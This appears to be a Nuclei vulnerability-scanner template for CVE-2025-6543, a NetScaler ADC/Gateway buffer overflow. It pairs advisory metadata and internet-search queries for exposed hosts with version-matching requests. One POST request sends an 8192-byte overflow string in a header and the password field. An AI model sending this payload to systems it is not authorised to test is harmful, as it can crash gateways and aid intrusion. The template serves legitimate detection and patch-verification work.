id: CVE-2025-6543

info:
  name: NetScaler ADC/Gateway - Buffer Overflow (CVE-2025-6543)
  author: nuclei-community
  severity: critical
  description: |
    A memory overflow vulnerability in NetScaler ADC and NetScaler Gateway leads to unintended control flow and potential remote code execution.
    This vulnerability affects NetScaler instances configured as Gateway (VPN virtual server, ICA Proxy, CVPN, RDP Proxy) or AAA virtual server.
    The vulnerability allows unauthenticated attackers to trigger buffer overflows through specially crafted requests.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-6543
    - https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX694788
    - https://www.netscaler.com/blog/news/netscaler-critical-security-updates-for-cve-2025-6543-and-cve-2025-5777/
    - https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-netscaler-adc-and-netscaler-gateway/
  classification:
    cvss-metrics: CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L
    cvss-score: 9.2
    cve-id: CVE-2025-6543
    cwe-id: CWE-120
    epss-score: 0.95000
    epss-percentile: 0.99900
    cpe: cpe:2.3:a:citrix:netscaler_application_delivery_controller:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: citrix
    product: netscaler_application_delivery_controller
    shodan-query:
      - http.favicon.hash:-1292923998 OR http.favicon.hash:-1166125415
      - title:"Citrix Gateway" OR title:"NetScaler Gateway"
    fofa-query: icon_hash="-1292923998" || icon_hash="-1166125415"
    google-query: intitle:"citrix gateway" OR intitle:"netscaler gateway"
  tags: cve,cve2025,citrix,netscaler,adc,gateway,buffer-overflow,rce,kev,critical

variables:
  session_token: "{{rand_text_alphanumeric(32)}}"
  overflow_payload: "{{repeat('A', 8192)}}"

http:
  - raw:
      - |
        GET /favicon.ico HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: */*
        Connection: close

      - |
        GET /logon/LogonPoint/index.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close

      - |
        POST /oauth/idp/.well-known/openid-configuration HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 8240
        X-Forwarded-For: {{overflow_payload}}
        X-Real-IP: 127.0.0.1
        Connection: close

        username={{session_token}}&password={{overflow_payload}}&domain=local&loginType=explicit

    unsafe: true

    extractors:
      - type: regex
        name: netscaler_version
        part: body_2
        group: 1
        regex:
          - 'NetScaler\s+(?:NS|ADC)?\s*(\d+\.\d+)[-_](\d+)\.(\d+)(?:[-_](FIPS|NDCPP))?'
        internal: true

      - type: regex
        name: server_header
        part: header_1
        group: 1
        regex:
          - 'Server:\s*(NetScaler[^\\r\\n]*)'
        internal: true

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "NetScaler"
          - "NSC_"
        condition: or

      - type: word
        part: body
        words:
          - "NetScaler Gateway"
          - "Citrix Gateway"
          - "NetScaler ADC"
        condition: or

      - type: regex
        part: body_2
        regex:
          - 'NetScaler\s+(?:NS|ADC)?\s*(1[23]\.\d+)[-_]([1-5]\d)\.(\d+)'
          - 'NetScaler\s+(?:NS|ADC)?\s*(14\.1)[-_]([1-4][0-6])\.(\d+)'
        condition: or

      - type: status
        status:
          - 200
          - 302
          - 401
          - 403
